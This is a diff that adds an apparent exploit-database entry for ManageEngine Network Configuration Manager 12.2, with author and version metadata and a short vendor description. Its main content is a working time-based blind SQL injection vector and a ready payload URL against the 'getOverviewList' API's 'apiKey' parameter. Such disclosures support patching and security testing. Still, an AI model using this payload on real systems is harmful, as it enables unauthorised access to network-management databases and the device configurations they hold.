@@ -1,0 +1,27 @@
+# Exploit Title: ManageEngine Network Configuration Manager 12.2 - 'apiKey' SQL Injection
+# discovery Date: 2019-01-24
+# published : 2020-01-20
+# Exploit Author: AmirHadi Yazdani
+# Vendor Homepage: https://www.manageengine.com/network-configuration-manager/
+# Software Link: https://www.manageengine.com/network-configuration-manager/
+# Demo: http://demo.networkconfigurationmanager.com
+# Version: <= Build Version  : 12.2
+# Tested on: win 2012 R2
+------------
+About ManageEngine Network Configuration Manager(NCM) (From Vendor Site) :     
+                                
+Network Configuration Manager is a multi vendor network change,
+configuration and compliance management (NCCCM) solution for switches, routers, firewalls and other network devices.
+NCM helps automate and take total control of the entire life cycle of device configuration management.
+--------------------------------------------------------
+
+Exploit POC :
+
+# Parameter: apiKey (GET)
+# Title: PostgreSQL Time Based Blind
+# Vector: AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))
+
+#Payload:  
+http://127.0.0.1/api/json/dashboard/getOverviewList?apiKey=1 AND 1398=(SELECT COUNT(*) FROM GENERATE_SERIES(1,3000000))&TimeFrame=hourly&_=1483732552930
+
+--------------------------
